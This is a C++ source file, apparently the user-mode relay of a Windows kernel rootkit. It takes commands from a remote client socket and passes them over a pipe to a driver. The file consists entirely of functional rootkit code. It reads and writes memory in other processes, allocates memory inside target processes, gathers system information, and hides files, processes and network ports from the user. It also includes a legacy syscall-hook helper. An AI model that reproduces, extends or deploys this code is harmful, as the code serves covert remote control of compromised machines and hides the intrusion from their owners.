#include "requests.h"
#pragma warning(disable : 4244)
#define MEDIUM_AS_SOURCE_MODULE "mymyymym"


// Legacy code, not used anymore
template<typename ... Arg>
ULONG64 CallHook(const Arg ... args) {
	printf("Loading user32.dll ..\n");
	if (LoadLibraryA("user32.dll") == NULL) {
		printf("Cannot call the function - user32.dll is not loaded!\n");
		return NULL;
	}
	printf("user32.dll loaded!\n");

	printf("Creating a pointer to the NtQueryCompositionSurfaceStatistics system service wrapper (win32u!NtQueryCompositionSurfaceStatistics)..\n");
	HMODULE Win32uHndl = LoadLibraryA("win32u.dll");
	if (Win32uHndl == NULL) {
		printf("Cannot call the function - win32u.dll is not loaded!\n");
		return NULL;
	}
	printf("win32u.dll loaded!\n");

	void* HookToFunc = GetProcAddress(Win32uHndl, "NtQueryCompositionSurfaceStatistics");  // get memory address of the hookto function (wrapper of a system service)
	if (HookToFunc == NULL) {
		printf("Cannot call the function - Could not get a pointer to NtQueryCompositionSurfaceStatistics from win32u.dll..\n");
		return NULL;
	}

	printf("Creating a function variable to use it for calling NtQueryCompositionSurfaceStatistics..\n");
	auto HookToVar = static_cast<uint64_t(_stdcall*)(Arg...)>(HookToFunc);  // export the function so i can call it

	printf("Calling the function variable with the supplier argument/s..\n");
	uint64_t HookToRet = HookToVar(args ...);

	printf("Function had worked and return value/s were received, wait for processing..\n");
	if (HookToRet == NULL) {
		printf("Function did not return anything (NULL)..\n");
		HookToRet = 1;
	}
	return HookToRet;
}


int DriverCalls::CallKernelDriver(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, BOOL PassBack, HANDLE* PipeHandle, LogFile* MediumLog) {
	/*
	if(CallHook(RootkInst) == NULL){
		printf("CallKernelDriver failed - CallHook() returned NULL!\n");
		return FALSE;
	}
	*/
	PASS_DATA SocketResult = { 0 };
	DWORD LastError = WritePipe(PipeHandle, (PVOID)RootkInst, sizeof(ROOTKIT_MEMORY), MediumLog);
	if (LastError != 0) {
		return -1;
	}

	LastError = ReadPipe(PipeHandle, (PVOID)RootkInst, sizeof(ROOTKIT_MEMORY), MediumLog);
	if (LastError != 0) {
		return -1;
	}

	if (PassBack) {
		SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0, MediumLog);
		if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
			LogMessage("CallKernelDriver failed - cannot return results from driver back to client!\n", MediumLog, TRUE, GetLastError());
			return 0;
		}
	}
	LogMessage("CallKernelDriver success!\n", MediumLog, FALSE, 0);
	return 1;
}


int DriverCalls::WriteKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* WriteFromStr, HANDLE* PipeHandle, LogFile* MediumLog) {
	PASS_DATA SocketResult = { 0 };
	ULONG64 SrcPID = 0;
	ULONG64 DstPID = 0;
	PVOID LocalWrite = NULL;
	PVOID WriteToMdl = NULL;
	char MdlMalloc = 1;
	ULONG WriteToMdlSize = 0;
	SIZE_T AllocSize = 0;
	ROOTKIT_UNEXERR Err = successful;
	SYSTEM_INFO LocalSysInfo = { 0 };

	// Get secondary module string (writing destination):
	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(WriteToMdlSize), &WriteToMdlSize, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(WriteToMdlSize)) {
		return 0;
	}

	WriteToMdl = malloc(WriteToMdlSize);
	if (WriteToMdl == NULL) {
		MdlMalloc = 0;
		root_internet::SendData(ClientToServerSocket, &MdlMalloc, sizeof(MdlMalloc), FALSE, 0, MediumLog);
		return  0;
	}
	SocketResult = root_internet::SendData(ClientToServerSocket, &MdlMalloc, sizeof(MdlMalloc), FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(MdlMalloc)) {
		free(WriteToMdl);
		return 0;
	}

	SocketResult = root_internet::RecvData(ClientToServerSocket, WriteToMdlSize, WriteToMdl, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != WriteToMdlSize) {
		free(WriteToMdl);
		return 0;
	}


	// Get main structure with parameters for the operation:
	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
		free(WriteToMdl);
		return 0;
	}
	RootkInst->DstMdlName = (char*)WriteToMdl;
	RootkInst->MdlName = WriteFromStr;
	GetSystemInfo(&LocalSysInfo);
	AllocSize = (SIZE_T)(((RootkInst->Size / LocalSysInfo.dwPageSize) + 1) * LocalSysInfo.dwPageSize);

	// if writing is from a user-supplied buffer receive the buffer:
	if (Err == successful) {
		if (strcmp(RootkInst->MdlName, "regular") == 0) {
			RootkInst->Status = (NTSTATUS)REGULAR_BUFFER;
			LocalWrite = malloc(AllocSize);
			if (!LocalWrite) {
				LogMessage("Cannot allocate buffer for writing locally\n", MediumLog, TRUE, GetLastError());
				free(WriteToMdl);
				Err = memalloc;
			}
			else {
				SocketResult = root_internet::RecvData(ClientToServerSocket, (int)RootkInst->Size, LocalWrite, FALSE, 0, MediumLog);
				if (SocketResult.err || SocketResult.value != RootkInst->Size) {
					LogMessage("Cannot get write value\n", MediumLog, TRUE, GetLastError());
					free(LocalWrite);
					free(WriteToMdl);
					return FALSE;
				}
				RootkInst->Buffer = LocalWrite;
			}
		}

	}

	if (Err == successful) {

		// Writing source module PID:
		if (strcmp(RootkInst->MdlName, MEDIUM_AS_SOURCE_MODULE) == 0 || strcmp(RootkInst->MdlName, "regular") == 0) {
			SrcPID = (ULONG64)GetCurrentProcessId();
		}
		else {
			SrcPID = (ULONG64)GetPID(RootkInst->MdlName);
		}

		if (SrcPID == NULL) {
			free(WriteToMdl);
			Err = relevantpid;
		}

		// Writing destination module PID:
		if (Err == successful) {
			if (strcmp(RootkInst->DstMdlName, MEDIUM_AS_SOURCE_MODULE) == 0) {
				DstPID = (ULONG64)GetCurrentProcessId();
			}

			else {
				DstPID = (ULONG64)GetPID(RootkInst->DstMdlName);
			}

			if (DstPID == NULL) {
				free(WriteToMdl);
				Err = relevantpid;
			}
		}
	}
	

	// Pass arguments, perform the operation and return the results to the client:
	RootkInst->Unexpected = Err;
	if (Err == successful) {
		RootkInst->MainPID = DstPID;
		RootkInst->SemiPID = SrcPID;
		RootkInst->MedPID = (ULONG64)GetCurrentProcessId();
		RootkInst->IsFlexible = TRUE;
		int DriverRes = CallKernelDriver(ClientToServerSocket, RootkInst, TRUE, PipeHandle, MediumLog);
		if (!RootkInst->IsFlexible) {
			LogMessage("transformation of regular data from KM-UM confirmed!\n", MediumLog, FALSE, 0);
		}
		else {
			LogMessage("transformation of regular data from KM-UM not working correctly!!\n", MediumLog, TRUE, GetLastError());
		}

		free(LocalWrite);
		free(WriteToMdl);
		return DriverRes;
	}
	else {
		SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0, MediumLog);
		return 0;
	}
}


int DriverCalls::ReadKernelCall(SOCKET ClientToServerSocket, PVOID LocalRead, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
	PASS_DATA SocketResult = { 0 };
	ULONG64 PrcID = 0;
	ULONG64 DstID = 0;
	ROOTKIT_UNEXERR Err = successful;
	int KrnlRes = 0;
	SIZE_T AllocSize = 0;
	char FailedValue = 1;
	SYSTEM_INFO LocalSysInfo = { 0 };


	// Receive the main structure with the parameters for the operation:
	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
		return 0;
	}

	RootkInst->MdlName = ModuleName;
	GetSystemInfo(&LocalSysInfo);
	AllocSize = (SIZE_T)(((RootkInst->Size / LocalSysInfo.dwPageSize) + 1) * LocalSysInfo.dwPageSize);
	LocalRead = malloc(AllocSize);
	if (LocalRead == NULL) {
		Err = memalloc;
	}


	// Configure reading source and destination PIDs:
	if (Err == successful) {
		DstID = (ULONG64)GetCurrentProcessId();
		if (DstID == NULL) {
			Err = relevantpid;
		}

		if (Err == successful) {
			if (strcmp(RootkInst->MdlName, MEDIUM_AS_SOURCE_MODULE) == 0) {
				PrcID = (ULONG64)GetCurrentProcessId();
			}
			else {
				PrcID = (ULONG64)GetPID(RootkInst->MdlName);
			}

			if (PrcID == NULL) {
				Err = relevantpid;
			}
		}
	}

	if (Err == successful) {
		// Pass arguments and perform the operation:
		RootkInst->Out = LocalRead;
		RootkInst->MainPID = PrcID;
		RootkInst->SemiPID = DstID;
		RootkInst->MedPID = (ULONG64)GetCurrentProcessId();
		RootkInst->IsFlexible = TRUE;
		KrnlRes = CallKernelDriver(ClientToServerSocket, RootkInst, FALSE, PipeHandle, MediumLog);
		if (!RootkInst->IsFlexible) {
			LogMessage("transformation of regular data from KM-UM confirmed!\n", MediumLog, FALSE, 0);
		}
		else {
			LogMessage("transformation of regular data from KM-UM not working correctly!!\n", MediumLog, TRUE, GetLastError());
		}
	}


	// Return the results of the operation to the client:
	if (Err == successful && KrnlRes == 1) {
		SocketResult = root_internet::SendData(ClientToServerSocket, LocalRead, (int)RootkInst->Size, FALSE, 0, MediumLog);
		if (SocketResult.err || SocketResult.value != (int)RootkInst->Size) {
			return 0;
		}
	}

	else {
		SocketResult = root_internet::SendData(ClientToServerSocket, &FailedValue, sizeof(FailedValue), FALSE, 0, MediumLog);
		return KrnlRes;
	}

	RootkInst->Unexpected = successful;
	SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
		return 0;
	}
	return 1;
}


int DriverCalls::MdlBaseKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
	PASS_DATA SocketResult = { 0 };
	ULONG64 PID = 0;
	int DriverRes = FALSE;


	// Receive the main structure with the parameters for the operation:
	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
		return 0;
	}
	RootkInst->MdlName = ModuleName;


	// Get module PID:
	if (strcmp(RootkInst->MdlName, MEDIUM_AS_SOURCE_MODULE) == 0) {
		PID = (ULONG64)GetCurrentProcessId();
	}
	else {
		PID = (ULONG64)GetPID(RootkInst->MdlName);
	}

	if (PID != NULL) {

		// Pass the arguments to the driver, perform the operation and return the results back to the client:
		RootkInst->Unexpected = successful;
		RootkInst->MainPID = PID;
		RootkInst->MedPID = (ULONG64)GetCurrentProcessId();
		RootkInst->IsFlexible = TRUE;
		DriverRes = CallKernelDriver(ClientToServerSocket, RootkInst, TRUE, PipeHandle, MediumLog);
		if (!RootkInst->IsFlexible) {
			LogMessage("transformation of regular data from KM-UM confirmed!\n", MediumLog, FALSE, 0);
		}
		else {
			LogMessage("transformation of regular data from KM-UM not working correctly!!\n", MediumLog, TRUE, GetLastError());
		}
		return DriverRes;
	}
	else {
		RootkInst->Unexpected = relevantpid;
		SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0, MediumLog);
		return 0;
	}
}


int DriverCalls::SysInfoKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, PVOID AttrBuffer, char* InfoTypesStr, ROOTKIT_UNEXERR Err, ULONG64 AttrBufferSize, HANDLE* PipeHandle, LogFile* MediumLog) {
	PASS_DATA SocketResult = { 0 };
	PVOID SysDataBuffer = NULL;
	ULONG64 TotalSize = 0;
	ULONG FailedSize = 12323;
	char FailedBuffer = 12;
	int KrnlRes = FALSE;


	// Receive the main structure with the parameters for the operation:
	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
		Err = receivedata;
	}
	else {
		RootkInst->MdlName = InfoTypesStr;
	}


	// Handling initial unexpected errors:
	if (Err != successful) {
		RootkInst->Unexpected = Err;
		SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0, MediumLog);
		return 0;
	}

	// Pass the arguments for the request of system information:
	RootkInst->Unexpected = successful;
	RootkInst->Operation = RKOP_SYSINFO;
	RootkInst->Buffer = AttrBuffer;
	RootkInst->MainPID = (ULONG64)GetCurrentProcessId();
	RootkInst->MedPID = (ULONG64)GetCurrentProcessId();
	RootkInst->Size = AttrBufferSize;
	RootkInst->IsFlexible = TRUE;
	KrnlRes = CallKernelDriver(ClientToServerSocket, RootkInst, TRUE, PipeHandle, MediumLog);
	if (!RootkInst->IsFlexible) {
		LogMessage("transformation of regular data from KM-UM confirmed!\n", MediumLog, FALSE, 0);
	}
	else {
		LogMessage("transformation of regular data from KM-UM not working correctly!!\n", MediumLog, TRUE, GetLastError());
	}


	// Return the actual buffer with system information to the client:
	if (KrnlRes == 1) {
		TotalSize = RootkInst->Size;
		SysDataBuffer = RootkInst->Out;
		SocketResult = root_internet::SendData(ClientToServerSocket, &TotalSize, sizeof(TotalSize), FALSE, 0, MediumLog);
		if (SocketResult.err || SocketResult.value != sizeof(TotalSize)) {
			VirtualFree(SysDataBuffer, 0, MEM_RELEASE);
			return 0;
		}

		SocketResult = root_internet::SendData(ClientToServerSocket, SysDataBuffer, (int)TotalSize, FALSE, 0, MediumLog);
		VirtualFree(SysDataBuffer, 0, MEM_RELEASE);
		if (SocketResult.err || SocketResult.value != (int)TotalSize) {
			return 0;
		}


		// Send back updated attribute buffer:
		SocketResult = root_internet::SendData(ClientToServerSocket, AttrBuffer, (int)AttrBufferSize, FALSE, 0, MediumLog);
		if (SocketResult.err || SocketResult.value != AttrBufferSize) {
			return 0;
		}
		return 1;
	}

	else {
		SocketResult = root_internet::SendData(ClientToServerSocket, &FailedSize, sizeof(FailedSize), FALSE, 0, MediumLog);
		return KrnlRes;
	}
}


int DriverCalls::AllocSpecKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog){
	PASS_DATA SocketResult = { 0 };
	ULONG64 PID = 0;
	int DriverRes = FALSE;
	PVOID InitAddr = NULL;
	char FailedSize = 1;


	// Receive the main structure with the parameters for the operation:
	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
		return 0;
	}


	// Get PID of the process allocating memory into:
	if (strcmp(ModuleName, MEDIUM_AS_SOURCE_MODULE) == 0) {
		PID = (ULONG64)GetCurrentProcessId();
	}
	else {
		PID = (ULONG64)GetPID(ModuleName);
	}


	// Pass arguments to the driver, perform the operation and return the results back to the client:
	if (PID != NULL) {
		RootkInst->Unexpected = successful;
		RootkInst->MdlName = ModuleName;
		RootkInst->MainPID = PID;
		RootkInst->MedPID = (ULONG64)GetCurrentProcessId();
		DriverRes = CallKernelDriver(ClientToServerSocket, RootkInst, TRUE, PipeHandle, MediumLog);
		if (!RootkInst->IsFlexible) {
			LogMessage("transformation of regular data from KM-UM confirmed!\n", MediumLog, FALSE, 0);
		}
		else {
			LogMessage("transformation of regular data from KM-UM not working correctly!!\n", MediumLog, TRUE, GetLastError());
		}

		if (RootkInst->Buffer == RootkInst->Out) {
			printf("Allocation address stayed the same (%p)!\n", RootkInst->Buffer);
		}
		else {
			printf("Allocation address did not stay the same (%p, %p)!\n", RootkInst->Buffer, RootkInst->Out);
		}
		return DriverRes;
	}
	else {
		SocketResult = root_internet::SendData(ClientToServerSocket, &FailedSize, sizeof(FailedSize), FALSE, 0, MediumLog);
		return 0;
	}
}




int DriverCalls::HideFileKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
	PASS_DATA SocketResult = { 0 };
	int DriverRes = FALSE;
	PVOID InitAddr = NULL;
	char FailedSize = 1;
	NTSTATUS RequestStatus = STATUS_UNSUCCESSFUL;
	WCHAR FilePath[1024] = { 0 };
	DWORD FilePathLength = 0;
	PVOID DummyAddress = NULL;


	// Receive the request status to verify if other preperations are needed:
	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(NTSTATUS), &RequestStatus, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(NTSTATUS)) {
		return 0;
	}
	if (RequestStatus == HIDE_FILEFOLDER) {
		SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(DWORD), &FilePathLength, FALSE, 0, MediumLog);
		if (SocketResult.err || SocketResult.value != sizeof(DWORD)) {
			return 0;
		}
		SocketResult = root_internet::RecvData(ClientToServerSocket, FilePathLength, FilePath, FALSE, 0, MediumLog);
		if (SocketResult.err || SocketResult.value != FilePathLength) {
			return 0;
		}
	}

	// Receive the main structure with the parameters for the operation:
	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
		return 0;
	}


	// Set important arguments:
	if (RequestStatus == HIDE_FILEFOLDER) {
		RootkInst->Buffer = (PVOID)FilePath;
		RootkInst->Size = (ULONG64)FilePathLength;
	}
	else if (RequestStatus == SHOWHIDDEN_FILEFOLDER) {
		RootkInst->Out = &DummyAddress;
	}


	// Pass struct argument to the driver:
	RootkInst->Unexpected = successful;
	RootkInst->MdlName = ModuleName;
	RootkInst->MainPID = (ULONG64)GetCurrentProcessId();
	RootkInst->MedPID = (ULONG64)GetCurrentProcessId();
	DriverRes = CallKernelDriver(ClientToServerSocket, RootkInst, TRUE, PipeHandle, MediumLog);
	if (!RootkInst->IsFlexible) {
		LogMessage("transformation of regular data from KM-UM confirmed!\n", MediumLog, FALSE, 0);
	}
	else {
		LogMessage("transformation of regular data from KM-UM not working correctly!!\n", MediumLog, TRUE, GetLastError());
	}


	// Parse returned data correctly (after sending back main struct):
	if ((DriverRes == 0 || DriverRes == 1) && RequestStatus == SHOWHIDDEN_FILEFOLDER && RootkInst->Size != 0) {
		SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst->Out, (int)RootkInst->Size, FALSE, 0, MediumLog);
		VirtualFree(RootkInst->Out, 0, MEM_RELEASE);  // Release the allocated memory that was injected into by driver
		if (SocketResult.err || SocketResult.value != RootkInst->Size) {
			return 0;
		}
	}
	return DriverRes;
}




int DriverCalls::HideProcessKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
	PASS_DATA SocketResult = { 0 };
	int DriverRes = FALSE;
	PVOID InitAddr = NULL;
	char FailedSize = 1;
	NTSTATUS RequestStatus = STATUS_UNSUCCESSFUL;
	PVOID DummyAddress = NULL;


	// Receive the request status to verify if other preperations are needed (add preoperations if needed):
	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(NTSTATUS), &RequestStatus, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(NTSTATUS)) {
		return 0;
	}


	// Receive the main structure with the parameters for the operation:
	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
		return 0;
	}


	// Set important arguments and verify parameters before sending to driver:
	if (RequestStatus == SHOWHIDDEN_PROCESS) {
		RootkInst->Out = &DummyAddress;  // A real address from medium should be provided for listing processes/ports
	}


	// Pass struct argument to the driver:
	RootkInst->Unexpected = successful;
	RootkInst->MdlName = ModuleName;
	RootkInst->MedPID = (ULONG64)GetCurrentProcessId();;
	DriverRes = CallKernelDriver(ClientToServerSocket, RootkInst, TRUE, PipeHandle, MediumLog);
	if (!RootkInst->IsFlexible) {
		LogMessage("transformation of regular data from KM-UM confirmed!\n", MediumLog, FALSE, 0);
	}
	else {
		LogMessage("transformation of regular data from KM-UM not working correctly!!\n", MediumLog, TRUE, GetLastError());
	}


	// Parse returned data correctly (after sending back main struct):
	if ((DriverRes == 0 || DriverRes == 1) && RequestStatus == SHOWHIDDEN_PROCESS && RootkInst->Size != 0) {
		SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst->Out, RootkInst->Size, FALSE, 0, MediumLog);
		VirtualFree(RootkInst->Out, 0, MEM_RELEASE);  // Release the allocated memory that was injected into by driver
		if (SocketResult.err || SocketResult.value != RootkInst->Size) {
			return 0;
		}
	}
	return DriverRes;
}


int DriverCalls::HidePortCommunicationKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
	PASS_DATA SocketResult = { 0 };
	int DriverRes = FALSE;
	PVOID InitAddr = NULL;
	char FailedSize = 1;
	NTSTATUS RequestStatus = STATUS_UNSUCCESSFUL;
	PVOID DummyAddress = NULL;


	// Receive the request status to verify if other preperations are needed (add preoperations here if needed):
	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(NTSTATUS), &RequestStatus, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(NTSTATUS)) {
		return 0;
	}


	// Receive the main structure with the parameters for the operation:
	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
		return 0;
	}


	// Set important arguments and verify parameters before sending to driver:
	if (RequestStatus == SHOWHIDDEN_PORTS) {
		RootkInst->Out = &DummyAddress;  // A real address from medium should be provided for listing processes/ports
	}


	// Pass struct argument to the driver:
	RootkInst->Unexpected = successful;
	RootkInst->MdlName = ModuleName;
	RootkInst->MedPID = (ULONG64)GetCurrentProcessId();;
	DriverRes = CallKernelDriver(ClientToServerSocket, RootkInst, TRUE, PipeHandle, MediumLog);
	if (!RootkInst->IsFlexible) {
		LogMessage("transformation of regular data from KM-UM confirmed!\n", MediumLog, FALSE, 0);
	}
	else {
		LogMessage("transformation of regular data from KM-UM not working correctly!!\n", MediumLog, TRUE, GetLastError());
	}


	// Parse returned data correctly (after sending back main struct):
	if ((DriverRes == 0 || DriverRes == 1) && RequestStatus == SHOWHIDDEN_PORTS && RootkInst->Size != 0) {
		SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst->Out, RootkInst->Size, FALSE, 0, MediumLog);
		VirtualFree(RootkInst->Out, 0, MEM_RELEASE);  // Release the allocated memory that was injected into by driver
		if (SocketResult.err || SocketResult.value != RootkInst->Size) {
			return 0;
		}
	}
	return DriverRes;
}